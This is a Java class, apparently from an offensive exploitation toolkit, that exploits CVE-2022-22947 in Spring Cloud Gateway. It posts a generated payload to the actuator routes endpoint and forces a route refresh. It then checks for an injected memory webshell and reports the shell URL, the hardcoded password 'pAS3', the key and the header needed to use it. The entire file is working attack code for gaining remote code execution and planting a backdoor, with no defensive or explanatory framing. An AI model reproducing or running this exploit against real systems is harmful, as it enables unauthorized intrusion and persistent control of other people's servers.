package exp.springgateway;

import core.GeneratePayload;
import exp.AttackBase;
import exp.BaseExp;
import okhttp3.Response;
import utils.Util;

import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

public class SpringGateWay_CVE_2022_22947 extends BaseExp implements AttackBase {

    public void attack(String stripUrl, String gadgetType, String payloadType, String trojanType)  {
        Object payload = null;
        try {
            payload = GeneratePayload.generatePayloadByte(gadgetType, payloadType, trojanType);
            HashMap<String, String> header = new HashMap<String, String>();
            header.put("Cache-Control", "max-age=0");
            header.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36");
            header.put("Accept-Encoding", "gzip, deflate");
            header.put("Accept-Language", "zh-CN,zh;q=0.9");
            String mime = "application/json";
//            String payloadString =  payload.toString();
            String payloadString =  new String((byte[])payload);
            this.launch(stripUrl + "/actuator/gateway/routes/" + trojanType,payloadString, mime, header);
            mime = "application/x-www-form-urlencoded";
            this.launch(stripUrl + "/actuator/gateway/refresh","", mime, header);
            if(payloadType.contains("Netty")){
                Util.messageQueue.add("请自行验证, 多次尝试（1+）！！！\n");
                Util.messageQueue.add(String.format("Shell_Url： %s\n", stripUrl + "/" + trojanType));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
                return;
            }
            header.put("X-Requested-With", "XmlHTTPRequest");
            header.put("tyr", "XmlHTTPRequest");
            Response response = this.launch(stripUrl + "/" + trojanType, "", mime, header);
            String bodyResult = response.body().string();
            response.close();
            if (bodyResult.contains("\"null\"")) {
                Util.messageQueue.add(String.format("Shell_Url： %s\n", stripUrl + "/" + trojanType));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
            }else {
                Util.messageQueue.add("注入失败");
            }

        }catch (Exception e){
            Util.messageQueue.add(String.format("注入过程发生错误： %s", e.getMessage()));
        }
    }

    @Override
    public void run(HashMap<String, String> params) {
        String target = params.get("target");
        String payloadType = params.get("payloadType");
        String gadgetType = params.get("gadgetType");
        String trojanType = Util.getRandomString(4);
        String stripUrl = this.getStripUrl(target);
        this.attack(stripUrl, gadgetType, payloadType, trojanType);
    }
}
